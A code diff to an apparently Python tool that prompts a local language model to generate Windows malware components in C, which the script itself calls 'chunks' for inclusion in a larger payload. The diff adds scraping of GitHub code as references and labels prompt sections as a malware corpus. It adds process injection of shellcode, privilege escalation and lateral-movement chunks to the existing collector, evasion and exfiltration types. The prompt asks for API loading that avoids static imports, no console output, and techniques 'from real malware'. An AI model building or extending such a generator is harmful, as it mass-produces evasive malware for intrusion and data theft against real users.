@@ -64,6 +64,86 @@ def query_chroma(query: str, n_results: int = 5) -> list[dict]:
         return []
 
 
+def search_web(query: str, num_results: int = 5) -> list[dict]:
+    """Search the web for recent techniques and code samples."""
+    try:
+        import httpx
+        # Use DuckDuckGo HTML search (no API key needed)
+        search_url = "https://html.duckduckgo.com/html/"
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+
+        # Add security/malware context to query
+        full_query = f"{query} site:github.com OR site:gist.github.com filetype:c"
+
+        response = httpx.post(
+            search_url,
+            data={"q": full_query},
+            headers=headers,
+            timeout=15,
+            follow_redirects=True
+        )
+
+        if response.status_code != 200:
+            print(f"  Web search returned {response.status_code}", file=sys.stderr)
+            return []
+
+        # Parse results (basic HTML parsing)
+        from html.parser import HTMLParser
+        results = []
+
+        class DDGParser(HTMLParser):
+            def __init__(self):
+                super().__init__()
+                self.in_result = False
+                self.current = {}
+
+            def handle_starttag(self, tag, attrs):
+                attrs_dict = dict(attrs)
+                if tag == "a" and "result__a" in attrs_dict.get("class", ""):
+                    self.in_result = True
+                    self.current = {"url": attrs_dict.get("href", ""), "title": ""}
+
+            def handle_data(self, data):
+                if self.in_result and self.current:
+                    self.current["title"] += data.strip()
+
+            def handle_endtag(self, tag):
+                if tag == "a" and self.in_result:
+                    if self.current.get("url") and self.current.get("title"):
+                        results.append(self.current)
+                    self.in_result = False
+                    self.current = {}
+
+        parser = DDGParser()
+        parser.feed(response.text)
+
+        # Fetch actual code from GitHub links
+        code_results = []
+        for r in results[:num_results]:
+            url = r.get("url", "")
+            if "github.com" in url and ("/blob/" in url or "gist.github" in url):
+                try:
+                    # Convert to raw URL
+                    raw_url = url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
+                    if "gist.github" in url:
+                        raw_url = url.replace("gist.github.com", "gist.githubusercontent.com") + "/raw"
+
+                    code_resp = httpx.get(raw_url, headers=headers, timeout=10, follow_redirects=True)
+                    if code_resp.status_code == 200 and len(code_resp.text) < 50000:
+                        code_results.append({
+                            "url": url,
+                            "title": r.get("title", ""),
+                            "code": code_resp.text[:3000]  # Limit code size
+                        })
+                except Exception:
+                    pass
+
+        return code_results
+    except Exception as e:
+        print(f"Web search failed: {e}", file=sys.stderr)
+        return []
+
+
 def call_llm(prompt: str, max_tokens: int = 4096) -> str:
     """Call local LLM for code generation."""
     try:
@@ -99,16 +179,30 @@ def generate_chunk_name(description: str, chunk_type: str) -> str:
 
 def generate_chunk_code(description: str, chunk_type: str, reference_code: list[dict]) -> tuple[str, dict]:
     """Generate chunk code using LLM."""
-    # Build prompt
-    ref_snippets = "\n\n".join([
-        f"// Reference from {r['metadata'].get('source', 'unknown')}:\n{r['code'][:1500]}"
-        for r in reference_code[:3]
-    ])
+    # Build prompt with references from corpus and web
+    corpus_refs = []
+    web_refs = []
+    for r in reference_code[:6]:
+        source = r['metadata'].get('source', r['metadata'].get('source_file', 'unknown'))
+        snippet = f"// Reference from {source}:\n{r['code'][:1200]}"
+        if 'http' in source or 'github' in source:
+            web_refs.append(snippet)
+        else:
+            corpus_refs.append(snippet)
+
+    ref_section = ""
+    if corpus_refs:
+        ref_section += "=== MALWARE CORPUS REFERENCES ===\n" + "\n\n".join(corpus_refs[:3]) + "\n\n"
+    if web_refs:
+        ref_section += "=== WEB RESEARCH REFERENCES (recent) ===\n" + "\n\n".join(web_refs[:3]) + "\n\n"
 
     category_map = {
         "collector": "collectors",
         "evasion": "evasion",
         "exfil": "exfil",
+        "privesc": "privesc",
+        "lateral": "lateral",
+        "injection": "injection",
     }
     category = category_map.get(chunk_type, chunk_type)
 
@@ -118,19 +212,21 @@ Chunk type: {chunk_type}
 Category path: {category}/
 
 Requirements:
-1. Pure C code (no C++), compatible with MinGW cross-compilation
+1. Pure C code (no C++), compatible with MinGW cross-compilation (x86_64-w64-mingw32-gcc)
 2. Use Windows API functions (include appropriate headers)
 3. Follow the chunk format with a main function named appropriately:
    - For collectors: collect_<name>() that calls emit() to output data
    - For evasion: check_<name>() or init_<name>() that returns success/failure
    - For exfil: exfiltrate(const char *addr, int port, const char *data, DWORD len)
-4. Use dynamic API loading (LoadLibraryA/GetProcAddress) for sensitive APIs
-5. Handle errors gracefully (don't crash)
+   - For privesc: elevate_<name>() or bypass_<name>() that returns success/failure
+   - For lateral: lateral_<name>(target, command, ...) that executes on remote host
+   - For injection: inject_<name>(pid, shellcode, size) that injects into target process
+4. Use dynamic API loading (LoadLibraryA/GetProcAddress) for sensitive APIs to avoid static imports
+5. Handle errors gracefully (don't crash, return error codes)
 6. No debug output or printf to console
+7. Use modern techniques from the reference code - they are from real malware and recent research
 
-Reference code for similar functionality:
-{ref_snippets}
-
+{ref_section}
 Output ONLY the C code, no explanation. The code should be a complete chunk that can be included in a larger payload.
 Start with the function definition directly (no #include, those go in metadata).
 """
@@ -239,7 +335,15 @@ def create_chunk(chunk_type: str, description: str, validate: bool = False,
 
     # Generate name
     name = generate_chunk_name(description, chunk_type)
-    category = {"collector": "collectors", "evasion": "evasion", "exfil": "exfil"}[chunk_type]
+    category_map = {
+        "collector": "collectors",
+        "evasion": "evasion",
+        "exfil": "exfil",
+        "privesc": "privesc",
+        "lateral": "lateral",
+        "injection": "injection",
+    }
+    category = category_map.get(chunk_type, chunk_type)
     chunk_path = CHUNKS_DIR / category / f"{name}.c"
 
     # Check if exists
@@ -250,14 +354,25 @@ def create_chunk(chunk_type: str, description: str, validate: bool = False,
 
     print(f"  Name: {category}/{name}")
 
-    # Query reference code
-    print("  Querying reference code...")
+    # Query reference code from ChromaDB
+    print("  Querying malware corpus (ChromaDB)...")
     references = query_chroma(description)
-    print(f"  Found {len(references)} references")
+    print(f"  Found {len(references)} corpus references")
+
+    # Search web for recent techniques
+    print("  Searching web for recent techniques...")
+    web_refs = search_web(f"{chunk_type} {description} windows c code")
+    print(f"  Found {len(web_refs)} web references")
+
+    # Combine references (corpus first, then web)
+    all_references = references + [
+        {"code": w["code"], "metadata": {"source": w["url"], "title": w["title"]}}
+        for w in web_refs
+    ]
 
     # Generate code
     print("  Generating code...")
-    code, metadata = generate_chunk_code(description, chunk_type, references)
+    code, metadata = generate_chunk_code(description, chunk_type, all_references)
 
     if not code:
         print("  Failed to generate code")
@@ -327,7 +442,8 @@ def create_chunk(chunk_type: str, description: str, validate: bool = False,
 
 def main():
     parser = argparse.ArgumentParser(description="Create new chunks with LLM assistance")
-    parser.add_argument("--type", required=True, choices=["collector", "evasion", "exfil"],
+    parser.add_argument("--type", required=True,
+                        choices=["collector", "evasion", "exfil", "privesc", "lateral", "injection"],
                         help="Type of chunk to create")
     parser.add_argument("--description", required=True, help="Description of what the chunk should do")
     parser.add_argument("--count", type=int, default=1, help="Number of variants to create")
